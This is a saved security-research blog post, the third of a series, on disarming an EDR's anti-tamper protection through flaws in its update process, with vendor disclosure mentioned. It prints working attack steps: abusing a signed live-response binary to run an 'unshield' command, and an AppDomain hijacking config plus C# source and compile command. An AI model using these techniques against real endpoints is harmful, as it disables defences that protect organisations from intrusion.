@@ -1,0 +1,313 @@
+# https://riccardoancarani.github.io/2023-11-07-attacking-an-edr-part-3/
+
+<!DOCTYPE html><html lang="en"><!-- Beautiful Jekyll | MIT license | Copyright Dean Attali 2016 -->
+
+
+  <body>
+
+    
+
+  
+    
+
+
+    <!-- TODO this file has become a mess, refactor it -->
+
+
+
+
+
+
+
+
+
+
+
+<div class="container">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+
+      
+
+      <article role="main" class="blog-post">
+        <h2 id="introduction">Introduction</h2>
+
+<p>DISCLAMER: This post was done in collaboration with Devid Lana. You can find his blog here: <a href="https://her0ness.github.io/2023-11-07-Attacking-an-EDR-Part-3/">https://her0ness.github.io</a></p>
+
+<p>In this third and last part of this series, we will dig deeper in the EDR’s update process and uncover some logic flaws that, ultimately, led us to the complete disarmament of the solution. Additionally, as an unexpected treat for our effort, a new ‘LOLBin’ was also discovered along the way. This part will be a bit more code-heavy, we will try to minimize the unnecessary bloat but the reader might need to pivot through some additional references to get the most out of this.</p>
+
+<p>As mentioned above, this part of the research was focused on the update process, whereby the solution will eventually need to either restart or adjust its own configuration to apply the new changes. For new changes, we primarily mean software updates that require binaries being modified or similar, not the simple update of the signature database.</p>
+
+<p>From a high level perspective, when a software needs to apply updates, the following scenarios are possible:</p>
+
+<ul>
+  <li>Update is done by the same component that needs updating</li>
+  <li>Update is delegated to an additional component that is solely responsible for that</li>
+</ul>
+
+<p>Whilst for a normal software this might not be a huge problem, for an EDR that needs to protect itself from unwanted modifications and tamper, this might be a non-trivial task to accomplish.</p>
+
+<p>In our attack scenario, we hypothesized that the solution under scrutiny <code class="language-plaintext highlighter-rouge">at some point</code> had to temporarily lift some of the countermeasures that would be usually in place, to allow the introduction of additional software components.</p>
+
+<p>By all means, not every update mechanism needs to function this way and we do not imply that this mechanism was flawed in its design. Every case should be carefully reviewed from an architectural and implementation perspective. However, more often than not, even extremely complex software’s architectures base core part of their security on assumptions that, in practice, might not align with reality. We do believe that installation, uninstallation and update processes should be included in the threat model of every vendor or company who is introducing third-party tooling in their estate. Some of the questions that you might start asking to guide the threat modeling exercise are the following:</p>
+
+<p><em>Does the EDR lower its security posture temporarily to allow updates? Is the time window sufficient for an attacker to perform malicious actions?</em>
+<em>How does the uninstall process work in practice? Does it need a code that is generated from a centralised tenant?</em> 
+<em>How much “trust” is given to the digital signature of the EDR software? Would a threat that lives in a signed process by the EDR vendor have more leeway compared to a malware that doesn’t?</em></p>
+
+<p>Assumptions such as:</p>
+
+<ul>
+  <li>A malware will not be able to obtain the same code signing certificate as the vendor</li>
+  <li>A malware will not be able to open privileged handles to EDR processes</li>
+</ul>
+
+<p>Can be misleading and give a false sense of security. Our recommendation is to start challenging those assumptions and start designing products that can withstand those situations.</p>
+
+<p>The assumption that an attack will happen necessarily when a solution is at its best state is simply incorrect. We’re clearly not the pioneers of this approach, and a similar concept was also discussed by Prelude Security’s team <a href="https://www.linkedin.com/posts/preludesecurity_an-argument-for-continuous-security-testing-activity-7099778443835228160-40Ix/">An Argument for Continous Security Testing</a>.</p>
+
+<p>Enough theory, let’s get our hands dirty.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<h3 id="crash-dump-files">Crash Dump Files</h3>
+
+<p>The process began by analyzing all the files, logs and in general artifacts that the EDR solution left on disk that were accessory to its functionality. Essentially we were looking at all the things that were “left over”.</p>
+
+<p>Unsurprisingly, within the <code class="language-plaintext highlighter-rouge">C:\ProgramData</code> folder, it was possible to find a subfolder related to the STRANGETRINITY product. Within that folder, a <code class="language-plaintext highlighter-rouge">UserCrashDump</code> directory was identified. The folder contained mostly text files, which apparently stored logs related to the installation and update of the product. Amongst all the entries, after a careful analysis, an interesting command line was found:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;TIMESTAMP&gt; Property Change: Adding ApplyConfigProtectRollback property, its value is: StrangeTrinity.exe unshield_from_authorized_process
+</code></pre></div></div>
+
+<p>Well, that sounded quite interesting. Obviously at that time we had no clue of what the functionality that command was, we could only guess by its name. However, it sounded promising enough to push us to continue towards that route.</p>
+
+<p>Without wasting too much time, we tried to run the same command again from an elevated command prompt and… …drumroll… it didn’t work! However, luckily for us, the program was kind enough to give us some hints of why it didn’t work. Specifically, the output that we obtained was something along the lines of:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Parent process is not signed by `Vendor`
+`Unshield not approved.`
+</code></pre></div></div>
+
+<h3 id="unshield-from-authorized-process">Unshield from authorized process</h3>
+
+<p>The error obtained by running the command above was informative enough to make us think that the primary check that the EDR service was performing was solely based on the validation of the digital signature of the process that is invoking the <code class="language-plaintext highlighter-rouge">StrangeTrinity.exe unshield_from_authorized_process</code> command.</p>
+
+<p>At this point we clearly had a problem, not being in possession of the private keys used to sign the STRANGETRINITY software, we simply couldn’t sign an arbitrary EXE and make it invoke our command. The following tests were then performed:</p>
+
+<ul>
+  <li>Injecting a shellcode into a running EDR process</li>
+  <li>Injecting a shellcode into a suspended EDR process that was created ad-hoc, is is known as fork-and-run pattern</li>
+  <li>Installing a rogue certification authority on the compromised host and sign an arbitrary EXE with a certificate with the same subject as the vendor’s</li>
+</ul>
+
+<p>Unfortunately, none of the above worked (although they are valid tests that we encourage the reader to attempt).</p>
+
+<h3 id="a-new-lolbin">A new LOLBin?</h3>
+
+<p>STRANGETRINITY, as most top tier EDRs, have some sort of <code class="language-plaintext highlighter-rouge">live response</code> feature that allows responders to run arbitrary commands and execute scripts on a host they are analyzing. If this sounds like a Command and Control, it’s because it mostly is!</p>
+
+<p>Different products implement this feature in different ways, however, STRANGETRINITY had a dedicated process that was spawned when an analyst initiated a live response session from the main tenant. The program was essentially executing a powershell process and piping its output to a named pipe; we imagine that the output then got sent to the main agent process and ultimately redirected to the centralized tenant for the analyst to see.</p>
+
+<p>A brief inspection of the executed processes using Sysmon’s EventID 1 revealed the command line that the solution used:</p>
+
+<p><code class="language-plaintext highlighter-rouge">StrangeTrinityResponseShell.exe “powershell.exe -enc ….”</code></p>
+
+<p>That looked simple enough! We quickly attempted to execute the StrangeTrinityResponseShell.exe with a different command line, and it worked perfectly. This, apart from being a LOLBin (which we will not publish to maintain the same level of integrity that we discussed in part 1 of this series), constituted an interesting primitive that we could then use to bypass the parent process signature check that was discussed in the chapter above.</p>
+
+<p>Testing this was simple enough, as we only had to execute the following command:</p>
+
+<p><code class="language-plaintext highlighter-rouge">StrangeTrinityResponseShell.exe “StrangeTrinity.exe unshield_from_authorized_process”</code></p>
+
+<p>With much surprise, we obtained an <code class="language-plaintext highlighter-rouge">Unshield approved</code> prompt, this looked like a crackme after all! Checking the EDR’s configuration by using the official troubleshooting utility indeed showed that the anti-tamper was disabled and the solution could be either uninstalled or tampered with trivially.</p>
+
+<p><img src="https://riccardoancarani.github.io/assets/2023-11-07-attacking-an-edr-part-3/path1.png" alt=""></p>
+
+<h3 id="appdomain-hijacking">Appdomain Hijacking</h3>
+
+<p>The LOLBin part was interesting, but before submitting the vulnerability to the vendor we kept looking for other avenues. This was done mostly to increase our chances for the report to deliver the right message.</p>
+
+<p>Another approach to execute code under the context of a signed process, is to utilize the Appdomain Hijacking technique. The technique is not something new and you can find extensive resources on the web. But in a nutshell, Appdomain hijacking is an attack that allows an adversary to force a legitimate .NET application to load a custom .NET assembly by specifying a set of entries within a manifest file. A manifest file is simply an XML configuration file with a .config extension. The web is full of fully functional PoCs that can be weaponized easily. However, in order to use this attack, we had to find a .NET binary that was also signed by the vendor.</p>
+
+<p>If you happen to have a VirusTotal enterprise subscription, it would be easier just to look for .NET binaries with the specific vendor in the signature tag and download the submitted files. Luckily we did not have to do any of that, as the vendor also installed a set of utilities to collect logs on the host in a separate folder, and one of them was written using the .NET framework.</p>
+
+<p>To exploit that, we copied the log agent utility in an arbitrary folder, and placed the following file named LogAgent.exe.config next to it:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;configuration&gt;
+   &lt;runtime&gt;
+  	&lt;assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1"&gt;
+     	&lt;probing privatePath="C:\Test"/&gt;
+  	&lt;/assemblyBinding&gt;
+      &lt;etwEnable enabled="false" /&gt;
+      &lt;appDomainManagerAssembly value="test, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null" /&gt;  
+      &lt;appDomainManagerType value="MyAppDomainManager" /&gt;  
+   &lt;/runtime&gt;
+&lt;/configuration&gt;
+</code></pre></div></div>
+
+<p>It is important that the name of the config file is the same as the executable that you are targeting, with a .config appended at the end, otherwise the attack will not work.</p>
+
+<p>Inspecting the configuration file above, it is possible to see that the config file specified that the application should load a new appdomain manager called <code class="language-plaintext highlighter-rouge">test</code>, which in this case is our custom malicious assembly. The code for the Test.cs file was following:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.IO;
+using System.IO.Compression;
+using System.EnterpriseServices;
+using System.Text;
+using System.Threading.Tasks;
+
+public sealed class MyAppDomainManager : AppDomainManager
+{
+   
+	public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
+	{   
+    
+   	    	 Program.Main(new string[] {});
+   	 
+	}
+}
+
+
+	public class Program
+	{
+ 	 
+
+    	public static void Main(string[] args)
+    	{
+   		  System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+   		  startInfo.FileName = @"C:\\Program Files\\STRANGETRINITY\\StrangeTrinity.exe";
+   		 startInfo.Arguments = "unshield_from_authorized_process";
+        	System.Diagnostics.Process.Start( startInfo);
+    	}
+	}
+</code></pre></div></div>
+
+<p>The snippet above shows the code of the malicious .NET assembly, which simply spawned the StrangeTrinity.exe process with the right command line in order to disable it.</p>
+
+<p>To compile the DLL, the csc.exe utility was used:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /platform:x64 /target:library /out:test.dll .\test.cs
+</code></pre></div></div>
+
+<p>To perform the attack, place all the files in the same folder:</p>
+
+<ul>
+  <li>LogAgent.exe.config</li>
+  <li>LogAgent.exe</li>
+  <li>test.dll</li>
+</ul>
+
+<p>Once the LogAgent.exe utility was then started, the malicious .NET DLL was loaded in the signed process which eventually launched the StrangeTrinity.exe. The attack worked as expected, unshielding the solution’s anti-tamper last line of defense, and the issue was communicated to the vendor.</p>
+
+<p><img src="https://riccardoancarani.github.io/assets/2023-11-07-attacking-an-edr-part-3/path2.png" alt=""></p>
+
+<h2 id="conclusions">Conclusions</h2>
+
+<p>This post concludes our series on attacking EDRs, we hope that you had as much fun reading it as we had writing it. A big shoutout to REDACTED for allowing us to test all the things we wanted and for being responsive with fixing the vulnerabilities. Despite knowing that the industry has a lot of potential for improvements in regards to collaborative research, we do really hope that this will lay a more solid foundation for future work. If you are a vendor and you’re willing to give us access to your solution, we will be happy to take a look at it!</p>
+
+<p>Devid &amp; Riccardo</p>
+
+
+      </article>
+
+      
+
+      
+        <!-- Check if any share-links are active -->
+
+
+
+
+<section id="social-share-section">
+  <span class="sr-only">Share: </span>
+
+  
+  <!--- Share on Twitter -->
+    <a href="https://twitter.com/intent/tweet?text=Attacking+an+EDR+-+Part+3&amp;url=https%3A%2F%2Friccardoancarani.github.io%2F2023-11-07-attacking-an-edr-part-3%2F" class="btn btn-social-icon btn-twitter" title="Share on Twitter">
+      <span class="fa fa-fw fa-twitter" aria-hidden="true"></span>
+      <span class="sr-only">Twitter</span>
+    </a>
+  
+
+  
+  <!--- Share on Facebook -->
+    <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Friccardoancarani.github.io%2F2023-11-07-attacking-an-edr-part-3%2F" class="btn btn-social-icon btn-facebook" title="Share on Facebook">
+      <span class="fa fa-fw fa-facebook" aria-hidden="true"></span>
+      <span class="sr-only">Facebook</span>
+    </a>
+  
+
+  
+  <!--- Share on LinkedIn -->
+    <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Friccardoancarani.github.io%2F2023-11-07-attacking-an-edr-part-3%2F" class="btn btn-social-icon btn-linkedin" title="Share on LinkedIn">
+      <span class="fa fa-fw fa-linkedin" aria-hidden="true"></span>
+      <span class="sr-only">LinkedIn</span>
+    </a>
+  
+
+</section>
+
+
+
+      
+
+      <ul class="pager blog-pager">
+        
+        <li class="previous">
+          <a href="https://riccardoancarani.github.io/2023-09-14-attacking-an-edr-part-2/" data-toggle="tooltip" data-placement="top" title="Attacking an EDR - Part 2">← Previous Post</a>
+        </li>
+        
+        
+      </ul>
+
+      
+        <div class="disqus-comments">
+          
+        </div>
+          
+        <div class="staticman-comments">
+          
+
+        </div>
+        <div class="justcomments-comments">
+          
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+
+    
+
+  
+    
+
+
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      
+    
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      
+    
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      
+    
+  
+
+
+
+
+
+
+  
+  
+
+</body></html>
